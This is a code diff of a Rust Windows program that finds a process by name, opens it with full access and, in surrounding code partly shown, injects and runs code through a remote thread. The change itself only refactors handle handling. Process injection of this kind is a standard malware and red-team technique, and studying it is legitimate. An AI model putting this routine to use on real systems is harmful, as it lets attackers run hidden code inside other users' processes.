@@ -34,7 +34,7 @@ const BUF: &[u8] = &[
     0x65, 0x78, 0x65, 0x00,
 ];
 
-fn find_pid(process_name: &str, pid: &mut u32) -> bool {
+fn get_process_handle(process_name: &str, pid: &mut u32) -> *mut c_void {
     unsafe {
         let mut process_entry = zeroed::<PROCESSENTRY32>();
 
@@ -47,12 +47,12 @@ fn find_pid(process_name: &str, pid: &mut u32) -> bool {
                 "[-] CreateToolhelp32Snapshot failed with error: {}",
                 GetLastError()
             );
-            return false;
+            return null_mut();
         }
 
         if Process32First(h_snapshot, &mut process_entry) == 0 {
             println!("[-] Process32First failed with error: {}", GetLastError());
-            return false;
+            return null_mut();
         }
 
         loop {
@@ -61,6 +61,13 @@ fn find_pid(process_name: &str, pid: &mut u32) -> bool {
                 .unwrap();
             if proc_name.to_lowercase() == process_name.to_lowercase() {
                 *pid = process_entry.th32ProcessID;
+                let h_process = OpenProcess(PROCESS_ALL_ACCESS, 1, *pid);
+                if h_process.is_null() {
+                    println!("[-] OpenProcess failed with error: {}", GetLastError());
+                    return null_mut();
+                } else {
+                    return h_process;
+                }
                 break;
             }
 
@@ -70,11 +77,11 @@ fn find_pid(process_name: &str, pid: &mut u32) -> bool {
         }
 
         if *pid == 0 {
-            return false;
+            return null_mut();
         }
     }
 
-    return true;
+    return null_mut();
 }
 
 fn pause() {
@@ -89,16 +96,14 @@ fn main() {
         let mut pid: u32 = 0;
         let mut h_process: *mut c_void = null_mut();
 
-        if !find_pid(process_name, &mut pid) {
+        h_process = get_process_handle(process_name, &mut pid);
+
+        if h_process.is_null() {
             println!("[-] Failed to find process: {}", process_name);
             return;
         }
 
         println!("[+] Found process {} with PID: {}", process_name, pid);
-
-        if !h_process.is_null() {
-            CloseHandle(h_process);
-        }
 
         let h_user32 = LoadLibraryA(TARGET_DLL.as_ptr() as *const i8);
 
@@ -117,7 +122,7 @@ fn main() {
 
         println!("[+] Found address of {} : {:p}", std::str::from_utf8(TARGET_FUNC).unwrap(), func_addr);
         
-        h_process = OpenProcess(PROCESS_ALL_ACCESS, 1, pid);
+        // h_process = OpenProcess(PROCESS_ALL_ACCESS, 1, pid);
 
         let mut bytes_written: usize = 0;
 
@@ -141,6 +146,8 @@ fn main() {
 
         WaitForSingleObject(h_thread, 0xFFFFFFFF);
 
+        CloseHandle(h_thread);
+        CloseHandle(h_process);
         pause();
 
     }
